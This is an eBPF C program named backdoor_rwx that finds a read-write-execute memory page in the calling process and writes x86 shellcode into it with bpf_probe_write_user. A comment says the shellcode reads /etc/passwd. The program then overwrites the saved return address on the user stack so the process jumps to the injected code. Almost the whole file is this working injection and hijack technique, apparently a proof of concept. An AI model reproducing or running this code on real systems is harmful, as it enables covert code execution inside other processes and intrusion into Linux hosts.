#define __TARGET_ARCH_x86

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

// https://github.com/torvalds/linux/blob/master/include/linux/mm.h#L275
// https://github.com/torvalds/linux/blob/master/fs/proc/task_mmu.c#L304
/*
 * vm_flags in vm_area_struct, see mm_types.h.
 * When changing, update also include/trace/events/mmflags.h
 */
#define VM_NONE        0x00000000

#define VM_READ        0x00000001    /* currently active flags */
#define VM_WRITE    0x00000002
#define VM_EXEC        0x00000004
#define VM_SHARED    0x00000008

struct bpf_iter_task_vma;

extern int bpf_iter_task_vma_new(struct bpf_iter_task_vma *it,
                                 struct task_struct *task,
                                 __u64 addr) __ksym;

extern struct vm_area_struct *bpf_iter_task_vma_next(struct bpf_iter_task_vma *it) __ksym;

extern void bpf_iter_task_vma_destroy(struct bpf_iter_task_vma *it) __ksym;

SEC("syscall")
int backdoor_rwx() {
    bpf_printk("bpf prog run success\n");

    struct task_struct *curr_task = (struct task_struct *) bpf_get_current_task_btf();
    bpf_printk("bpf pid %d", curr_task->pid);

    struct mm_struct *mm = curr_task->mm;
    bpf_printk("mm addr %lx", mm);
    bpf_printk("mmap_base addr %lx", mm->mmap_base);

    struct bpf_iter_task_vma vma_it;
    struct vm_area_struct *vma_ptr;
    bpf_iter_task_vma_new(&vma_it, curr_task, 0);

    int found = 0;
    for (int i = 0; i < 128; i++) {
        vma_ptr = bpf_iter_task_vma_next(&vma_it);
        vm_flags_t vm_flag = BPF_CORE_READ(vma_ptr, vm_flags);
        struct anon_vma *anon_vma = BPF_CORE_READ(vma_ptr, anon_vma);
        // 需要 anon_vma != null, 代表这个物理页已经被分配了

        if ((vm_flag & VM_READ) > 0 && (vm_flag & VM_WRITE) > 0 && (vm_flag & VM_EXEC) > 0 && anon_vma != NULL) {
            found = 1;
            break;
        }
    }

    bpf_iter_task_vma_destroy(&vma_it);

    if (!found) {
        bpf_printk("rwx page not found!");
        return 0;
    }

    void *rwx_start = (void *) BPF_CORE_READ(vma_ptr, vm_start);
    bpf_printk("vm addr %lx", rwx_start);

    long long data;
    bpf_probe_read(&data, sizeof(data), rwx_start);
    bpf_printk("rwx_start_data %lx", data);

    // shell code => cat /etc/passwd; exit;
    char shellcode[] = "\x68\x72\x76\x65\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x2f\x65\x74\x63\x2f\x70\x61\x73\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
                       "\x31\xff\x31\xc0\xb0\xe7\x0f\x05";
    long status = bpf_probe_write_user(rwx_start, &shellcode, sizeof(shellcode));
    bpf_printk("write shellcode status %d", status);

    bpf_probe_read(&data, sizeof(data), rwx_start);
    bpf_printk("rwx_start_data %lx", data);

    struct pt_regs *regs = (struct pt_regs *) bpf_task_pt_regs(curr_task);
    void *rbp = (void *) PT_REGS_FP(regs);
    bpf_printk("rbp %lx", rbp);

    void *ret_addr;
    bpf_probe_read(&ret_addr, sizeof(ret_addr), rbp + sizeof(rbp));
    bpf_printk("ret_addr %lx", ret_addr);

    status = bpf_probe_write_user(rbp + sizeof(rbp), &rwx_start, sizeof(rwx_start));
    bpf_printk("write ret_addr status %d", status);
    return 0;
}

char _license[] SEC("license") = "GPL";